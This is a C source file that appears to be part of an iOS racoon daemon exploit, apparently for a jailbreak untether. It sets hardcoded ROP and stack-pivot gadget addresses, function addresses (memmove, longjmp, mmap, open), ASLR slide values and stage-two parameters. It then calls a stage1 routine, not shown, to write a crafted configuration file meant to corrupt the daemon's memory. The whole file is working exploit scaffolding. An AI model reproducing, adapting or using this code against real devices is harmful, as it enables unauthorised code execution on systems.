#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include "common.h"
#include "stage1.h"

void generate(char* filename, offset_struct_t * offsets) {
	int f = open(filename,O_WRONLY | O_CREAT);
	stage1(f,offsets);
}

int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
{
	offset_struct_t myoffsets;
	myoffsets.dns4_array_to_lcconf = -((0x100067c10+0x28-4*8)-0x1000670e0);
	myoffsets.lcconf_counter_offset = 0x10c;
	myoffsets.memmove = 0x1aa0b8bb8;
	myoffsets.longjmp = 0x180a817dc;
	myoffsets.mmap = 0x18095942c;
	myoffsets.open = 0x1809779ac;
	myoffsets.max_slide = 0x66dc000;
	myoffsets.slide_value = 0x4000;
	myoffsets.pivot_x21 = 0x1990198fc;
	myoffsets.str_buff_offset = 8;
	myoffsets.BEAST_GADGET = 0x1a0478c70;
	myoffsets.stage2_base = 0x200000000;
	myoffsets.stage2_size = 0x1000;

	generate("./test.conf",&myoffsets);

	return 0;
}
